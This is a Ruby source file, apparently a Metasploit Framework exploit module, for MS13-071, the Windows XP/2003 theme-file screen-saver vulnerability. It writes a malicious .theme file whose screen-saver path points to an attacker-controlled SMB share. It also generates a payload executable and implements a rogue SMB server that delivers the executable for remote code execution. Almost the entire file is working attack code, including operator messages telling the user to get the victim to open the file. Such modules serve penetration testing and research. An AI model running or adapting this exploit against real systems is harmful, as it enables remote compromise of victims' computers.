# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::SMBServer

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability mainly affecting Microsoft Windows XP and Windows
        2003. The vulnerability exists in the handling of the Screen Saver path, in the [boot]
        section. An arbitrary path can be used as screen saver, including a remote SMB resource,
        which allows for remote code execution when a malicious .theme file is opened, and the
        "Screen Saver" tab is viewed.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Eduardo Prado&#039;, # Vulnerability discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2013-0810&#039;],
          [&#039;OSVDB&#039;, &#039;97136&#039;],
          [&#039;MSB&#039;, &#039;MS13-071&#039;],
          [&#039;BID&#039;, &#039;62176&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 2048,
          &#039;DisableNops&#039; => true
        },
      &#039;DefaultOptions&#039; =>
        {
          &#039;DisablePayloadHandler&#039; => &#039;false&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;Windows XP SP3 / Windows 2003 SP2&#039;, {}],
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Sep 10 2013",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;FILENAME&#039;, [true, &#039;The theme file&#039;, &#039;msf.theme&#039;]),
          OptString.new(&#039;UNCPATH&#039;, [ false, &#039;Override the UNC path to use (Ex: \\\\192.168.1.1\\share\\exploit.scr)&#039; ])
        ], self.class)
  end

  def exploit

    if (datastore[&#039;UNCPATH&#039;])
      @unc = datastore[&#039;UNCPATH&#039;]
      print_status("Remember to share the malicious EXE payload as #{@unc}")
    else
      print_status("Generating our malicious executable...")
      @exe = generate_payload_exe
      my_host = (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address : datastore[&#039;SRVHOST&#039;]
      @share = rand_text_alpha(5 + rand(5))
      @scr_file = "#{rand_text_alpha(5 + rand(5))}.scr"
      @hi, @lo = UTILS.time_unix_to_smb(Time.now.to_i)
      @unc = "\\\\#{my_host}\\#{@share}\\#{@scr_file}"
    end

    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
    # Default Windows XP / 2003 theme modified
    theme = <<-EOF
; Copyright Â© Microsoft Corp. 1995-2001

[Theme]
DisplayName=@themeui.dll,-2016

; My Computer
[CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon]
DefaultValue=%WinDir%explorer.exe,0

; My Documents
[CLSID\\{450D8FBA-AD25-11D0-98A8-0800361B1103}\\DefaultIcon]
DefaultValue=%WinDir%SYSTEM32\\mydocs.dll,0

; My Network Places
[CLSID\\{208D2C60-3AEA-1069-A2D7-08002B30309D}\\DefaultIcon]
DefaultValue=%WinDir%SYSTEM32\\shell32.dll,17

; Recycle Bin
[CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon]
full=%WinDir%SYSTEM32\\shell32.dll,32
empty=%WinDir%SYSTEM32\\shell32.dll,31

[Control Panel\\Desktop]
Wallpaper=
TileWallpaper=0
WallpaperStyle=2
Pattern=
ScreenSaveActive=0

[boot]
SCRNSAVE.EXE=#{@unc}

[MasterThemeSelector]
MTSM=DABJDKT
    EOF
    file_create(theme)
    print_good("Let your victim open #{datastore[&#039;FILENAME&#039;]}")

    if not datastore[&#039;UNCPATH&#039;]
      print_status("Ready to deliver your payload on #{@unc}")
      super
    end

  end

  # TODO: these smb_* methods should be moved up to the SMBServer mixin
  # development and test on progress

  def smb_cmd_dispatch(cmd, c, buff)
    smb = @state[c]
    vprint_status("Received command #{cmd} from #{smb[:name]}")

    pkt = CONST::SMB_BASE_PKT.make_struct
    pkt.from_s(buff)
    #Record the IDs
    smb[:process_id] = pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;ProcessID&#039;]
    smb[:user_id] = pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;UserID&#039;]
    smb[:tree_id] = pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;TreeID&#039;]
    smb[:multiplex_id] = pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;MultiplexID&#039;]

    case cmd
      when CONST::SMB_COM_NEGOTIATE
        smb_cmd_negotiate(c, buff)
      when CONST::SMB_COM_SESSION_SETUP_ANDX
        wordcount = pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;WordCount&#039;]
        if wordcount == 0x0D # It&#039;s the case for Share Security Mode sessions
          smb_cmd_session_setup(c, buff)
        else
          vprint_status("SMB Capture - #{smb[:ip]} Unknown SMB_COM_SESSION_SETUP_ANDX request type , ignoring... ")
          smb_error(cmd, c, CONST::SMB_STATUS_SUCCESS)
        end
      when CONST::SMB_COM_TRANSACTION2
        smb_cmd_trans(c, buff)
      when CONST::SMB_COM_NT_CREATE_ANDX
        smb_cmd_create(c, buff)
      when CONST::SMB_COM_READ_ANDX
        smb_cmd_read(c, buff)
      else
        vprint_status("SMB Capture - Ignoring request from #{smb[:name]} - #{smb[:ip]} (#{cmd})")
        smb_error(cmd, c, CONST::SMB_STATUS_SUCCESS)
    end
  end


  def smb_cmd_negotiate(c, buff)
    pkt = CONST::SMB_NEG_PKT.make_struct
    pkt.from_s(buff)

    dialects = pkt[&#039;Payload&#039;].v[&#039;Payload&#039;].gsub(/\x00/, &#039;&#039;).split(/\x02/).grep(/^\w+/)

    dialect = dialects.index("NT LM 0.12") || dialects.length-1

    pkt = CONST::SMB_NEG_RES_NT_PKT.make_struct
    smb_set_defaults(c, pkt)

    time_hi, time_lo = UTILS.time_unix_to_smb(Time.now.to_i)

    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Command&#039;] = CONST::SMB_COM_NEGOTIATE
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags1&#039;] = 0x88
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags2&#039;] = 0xc001
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;WordCount&#039;] = 17
    pkt[&#039;Payload&#039;].v[&#039;Dialect&#039;] = dialect
    pkt[&#039;Payload&#039;].v[&#039;SecurityMode&#039;] = 2 # SHARE Security Mode
    pkt[&#039;Payload&#039;].v[&#039;MaxMPX&#039;] = 50
    pkt[&#039;Payload&#039;].v[&#039;MaxVCS&#039;] = 1
    pkt[&#039;Payload&#039;].v[&#039;MaxBuff&#039;] = 4356
    pkt[&#039;Payload&#039;].v[&#039;MaxRaw&#039;] = 65536
    pkt[&#039;Payload&#039;].v[&#039;SystemTimeLow&#039;] = time_lo
    pkt[&#039;Payload&#039;].v[&#039;SystemTimeHigh&#039;] = time_hi
    pkt[&#039;Payload&#039;].v[&#039;ServerTimeZone&#039;] = 0x0
    pkt[&#039;Payload&#039;].v[&#039;SessionKey&#039;] = 0
    pkt[&#039;Payload&#039;].v[&#039;Capabilities&#039;] = 0x80f3fd
    pkt[&#039;Payload&#039;].v[&#039;KeyLength&#039;] = 8
    pkt[&#039;Payload&#039;].v[&#039;Payload&#039;] = Rex::Text.rand_text_hex(8)

    c.put(pkt.to_s)
  end

  def smb_cmd_session_setup(c, buff)

    pkt = CONST::SMB_SETUP_RES_PKT.make_struct
    smb_set_defaults(c, pkt)

    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Command&#039;] = CONST::SMB_COM_SESSION_SETUP_ANDX
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags1&#039;] = 0x88
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags2&#039;] = 0xc001
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;WordCount&#039;] = 3
    pkt[&#039;Payload&#039;].v[&#039;AndX&#039;] = 0x75
    pkt[&#039;Payload&#039;].v[&#039;Reserved1&#039;] = 00
    pkt[&#039;Payload&#039;].v[&#039;AndXOffset&#039;] = 96
    pkt[&#039;Payload&#039;].v[&#039;Action&#039;] = 0x1 # Logged in as Guest
    pkt[&#039;Payload&#039;].v[&#039;Payload&#039;] =
      Rex::Text.to_unicode("Unix", &#039;utf-16be&#039;) + "\x00\x00" + # Native OS # Samba signature
      Rex::Text.to_unicode("Samba 3.4.7", &#039;utf-16be&#039;) + "\x00\x00" + # Native LAN Manager # Samba signature
      Rex::Text.to_unicode("WORKGROUP", &#039;utf-16be&#039;) + "\x00\x00\x00" + # Primary DOMAIN # Samba signature
    tree_connect_response = ""
    tree_connect_response << [7].pack("C")  # Tree Connect Response : WordCount
    tree_connect_response << [0xff].pack("C") # Tree Connect Response : AndXCommand
    tree_connect_response << [0].pack("C") # Tree Connect Response : Reserved
    tree_connect_response << [0].pack("v")  # Tree Connect Response : AndXOffset
    tree_connect_response << [0x1].pack("v")  # Tree Connect Response : Optional Support
    tree_connect_response << [0xa9].pack("v") # Tree Connect Response : Word Parameter
    tree_connect_response << [0x12].pack("v")  # Tree Connect Response : Word Parameter
    tree_connect_response << [0].pack("v") # Tree Connect Response : Word Parameter
    tree_connect_response << [0].pack("v") # Tree Connect Response : Word Parameter
    tree_connect_response << [13].pack("v") # Tree Connect Response : ByteCount
    tree_connect_response << "A:\x00" # Service
    tree_connect_response << "#{Rex::Text.to_unicode("NTFS")}\x00\x00" # Extra byte parameters
    # Fix the Netbios Session Service Message Length
    # to have into account the tree_connect_response,
    # need to do this because there isn&#039;t support for
    # AndX still
    my_pkt = pkt.to_s + tree_connect_response
    original_length = my_pkt[2, 2].unpack("n").first
    original_length = original_length +  tree_connect_response.length
    my_pkt[2, 2] = [original_length].pack("n")
    c.put(my_pkt)
  end

  def smb_cmd_create(c, buff)
    pkt = CONST::SMB_CREATE_PKT.make_struct
    pkt.from_s(buff)

    if pkt[&#039;Payload&#039;].v[&#039;Payload&#039;] =~ /#{Rex::Text.to_unicode("#{@scr_file}\x00")}/
      pkt = CONST::SMB_CREATE_RES_PKT.make_struct
      smb_set_defaults(c, pkt)
      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Command&#039;] = CONST::SMB_COM_NT_CREATE_ANDX
      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags1&#039;] = 0x88
      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags2&#039;] = 0xc001
      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;WordCount&#039;] = 42
      pkt[&#039;Payload&#039;].v[&#039;AndX&#039;] = 0xff # no further commands
      pkt[&#039;Payload&#039;].v[&#039;OpLock&#039;] = 0x2
      # No need to track fid here, we&#039;re just offering one file
      pkt[&#039;Payload&#039;].v[&#039;FileID&#039;] = rand(0x7fff) + 1 # To avoid fid = 0
      pkt[&#039;Payload&#039;].v[&#039;Action&#039;] = 0x1 # The file existed and was opened
      pkt[&#039;Payload&#039;].v[&#039;CreateTimeLow&#039;] = @lo
      pkt[&#039;Payload&#039;].v[&#039;CreateTimeHigh&#039;] = @hi
      pkt[&#039;Payload&#039;].v[&#039;AccessTimeLow&#039;] = @lo
      pkt[&#039;Payload&#039;].v[&#039;AccessTimeHigh&#039;] = @hi
      pkt[&#039;Payload&#039;].v[&#039;WriteTimeLow&#039;] = @lo
      pkt[&#039;Payload&#039;].v[&#039;WriteTimeHigh&#039;] = @hi
      pkt[&#039;Payload&#039;].v[&#039;ChangeTimeLow&#039;] = @lo
      pkt[&#039;Payload&#039;].v[&#039;ChangeTimeHigh&#039;] = @hi
      pkt[&#039;Payload&#039;].v[&#039;Attributes&#039;] = 0x80 # Ordinary file
      pkt[&#039;Payload&#039;].v[&#039;AllocLow&#039;] = 0x100000
      pkt[&#039;Payload&#039;].v[&#039;AllocHigh&#039;] = 0
      pkt[&#039;Payload&#039;].v[&#039;EOFLow&#039;] = @exe.length
      pkt[&#039;Payload&#039;].v[&#039;EOFHigh&#039;] = 0
      pkt[&#039;Payload&#039;].v[&#039;FileType&#039;] = 0
      pkt[&#039;Payload&#039;].v[&#039;IPCState&#039;] = 0x7
      pkt[&#039;Payload&#039;].v[&#039;IsDirectory&#039;] = 0
      c.put(pkt.to_s)
    else
      pkt = CONST::SMB_CREATE_RES_PKT.make_struct
      smb_set_defaults(c, pkt)
      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Command&#039;] = CONST::SMB_COM_NT_CREATE_ANDX
      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;ErrorClass&#039;] = 0xC0000034 # OBJECT_NAME_NOT_FOUND
      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags1&#039;] = 0x88
      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags2&#039;] = 0xc001
      c.put(pkt.to_s)
    end

  end

  def smb_cmd_read(c, buff)
    pkt = CONST::SMB_READ_PKT.make_struct
    pkt.from_s(buff)

    offset = pkt[&#039;Payload&#039;].v[&#039;Offset&#039;]
    length = pkt[&#039;Payload&#039;].v[&#039;MaxCountLow&#039;]

    pkt = CONST::SMB_READ_RES_PKT.make_struct
    smb_set_defaults(c, pkt)

    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Command&#039;] = CONST::SMB_COM_READ_ANDX
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags1&#039;] = 0x88
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags2&#039;] = 0xc001
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;WordCount&#039;] = 12
    pkt[&#039;Payload&#039;].v[&#039;AndX&#039;] = 0xff # no more commands
    pkt[&#039;Payload&#039;].v[&#039;Remaining&#039;] = 0xffff
    pkt[&#039;Payload&#039;].v[&#039;DataLenLow&#039;] = length
    pkt[&#039;Payload&#039;].v[&#039;DataOffset&#039;] = 59
    pkt[&#039;Payload&#039;].v[&#039;DataLenHigh&#039;] = 0
    pkt[&#039;Payload&#039;].v[&#039;Reserved3&#039;] = 0
    pkt[&#039;Payload&#039;].v[&#039;Reserved4&#039;] = 6
    pkt[&#039;Payload&#039;].v[&#039;ByteCount&#039;] = length
    pkt[&#039;Payload&#039;].v[&#039;Payload&#039;] = @exe[offset, length]

    c.put(pkt.to_s)
  end

  def smb_cmd_trans(c, buff)
    pkt = CONST::SMB_TRANS2_PKT.make_struct
    pkt.from_s(buff)

    sub_command = pkt[&#039;Payload&#039;].v[&#039;SetupData&#039;].unpack("v").first
    case sub_command
      when 0x5 # QUERY_PATH_INFO
        smb_cmd_trans_query_path_info(c, buff)
      when 0x1 # FIND_FIRST2
        smb_cmd_trans_find_first2(c, buff)
      else
        pkt = CONST::SMB_TRANS_RES_PKT.make_struct
        smb_set_defaults(c, pkt)
        pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Command&#039;] = CONST::SMB_COM_TRANSACTION2
        pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags1&#039;] = 0x88
        pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags2&#039;] = 0xc001
        pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;ErrorClass&#039;] = 0xc0000225 # NT_STATUS_NOT_FOUND
        c.put(pkt.to_s)
    end
  end

  def smb_cmd_trans_query_path_info(c, buff)
    pkt = CONST::SMB_TRANS2_PKT.make_struct
    pkt.from_s(buff)

    if pkt[&#039;Payload&#039;].v[&#039;SetupData&#039;].length < 16
      # if QUERY_PATH_INFO_PARAMETERS doesn&#039;t include a file name,
      # return a Directory answer
      pkt = CONST::SMB_TRANS_RES_PKT.make_struct
      smb_set_defaults(c, pkt)

      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Command&#039;] = CONST::SMB_COM_TRANSACTION2
      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags1&#039;] = 0x88
      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags2&#039;] = 0xc001
      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;WordCount&#039;] = 10
      pkt[&#039;Payload&#039;].v[&#039;ParamCountTotal&#039;] = 2
      pkt[&#039;Payload&#039;].v[&#039;DataCountTotal&#039;] = 40
      pkt[&#039;Payload&#039;].v[&#039;ParamCount&#039;] = 2
      pkt[&#039;Payload&#039;].v[&#039;ParamOffset&#039;] = 56
      pkt[&#039;Payload&#039;].v[&#039;DataCount&#039;] = 40
      pkt[&#039;Payload&#039;].v[&#039;DataOffset&#039;] = 60
      pkt[&#039;Payload&#039;].v[&#039;Payload&#039;] =
        "\x00" + # Padding
        # QUERY_PATH_INFO Parameters
        "\x00\x00" + # EA Error Offset
        "\x00\x00" + # Padding
        #QUERY_PATH_INFO Data
        [@lo, @hi].pack("VV") + # Created
        [@lo, @hi].pack("VV") + # Last Access
        [@lo, @hi].pack("VV") + # Last Write
        [@lo, @hi].pack("VV") + # Change
        "\x10\x00\x00\x00" + # File attributes => directory
        "\x00\x00\x00\x00" # Unknown
      c.put(pkt.to_s)

    else
      # if QUERY_PATH_INFO_PARAMETERS includes a file name,
      # returns an object name not found error
      pkt = CONST::SMB_TRANS_RES_PKT.make_struct
      smb_set_defaults(c, pkt)

      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Command&#039;] = CONST::SMB_COM_TRANSACTION2
      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;ErrorClass&#039;] = 0xC0000034 #OBJECT_NAME_NOT_FOUND
      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags1&#039;] = 0x88
      pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags2&#039;] = 0xc001
      c.put(pkt.to_s)

    end
  end

  def smb_cmd_trans_find_first2(c, buff)

    pkt = CONST::SMB_TRANS_RES_PKT.make_struct
    smb_set_defaults(c, pkt)

    file_name = Rex::Text.to_unicode(@scr_file)

    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Command&#039;] = CONST::SMB_COM_TRANSACTION2
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags1&#039;] = 0x88
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags2&#039;] = 0xc001
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;WordCount&#039;] = 10
    pkt[&#039;Payload&#039;].v[&#039;ParamCountTotal&#039;] = 10
    pkt[&#039;Payload&#039;].v[&#039;DataCountTotal&#039;] = 94 + file_name.length
    pkt[&#039;Payload&#039;].v[&#039;ParamCount&#039;] = 10
    pkt[&#039;Payload&#039;].v[&#039;ParamOffset&#039;] = 56
    pkt[&#039;Payload&#039;].v[&#039;DataCount&#039;] = 94 + file_name.length
    pkt[&#039;Payload&#039;].v[&#039;DataOffset&#039;] = 68
    pkt[&#039;Payload&#039;].v[&#039;Payload&#039;] =
      "\x00" + # Padding
      # FIND_FIRST2 Parameters
      "\xfd\xff" + # Search ID
      "\x01\x00" + # Search count
      "\x01\x00" + # End Of Search
      "\x00\x00" + # EA Error Offset
      "\x00\x00" + # Last Name Offset
      "\x00\x00" + # Padding
      #QUERY_PATH_INFO Data
      [94 + file_name.length].pack("V") + # Next Entry Offset
      "\x00\x00\x00\x00" + # File Index
      [@lo, @hi].pack("VV") + # Created
      [@lo, @hi].pack("VV") + # Last Access
      [@lo, @hi].pack("VV") + # Last Write
      [@lo, @hi].pack("VV") + # Change
      [@exe.length].pack("V") + "\x00\x00\x00\x00" + # End Of File
      "\x00\x00\x10\x00\x00\x00\x00\x00" + # Allocation size
      "\x80\x00\x00\x00" + # File attributes => directory
      [file_name.length].pack("V") + # File name len
      "\x00\x00\x00\x00" + # EA List Lenght
      "\x00" + # Short file lenght
      "\x00" + # Reserved
      ("\x00" * 24) +
      file_name

    c.put(pkt.to_s)
  end

end

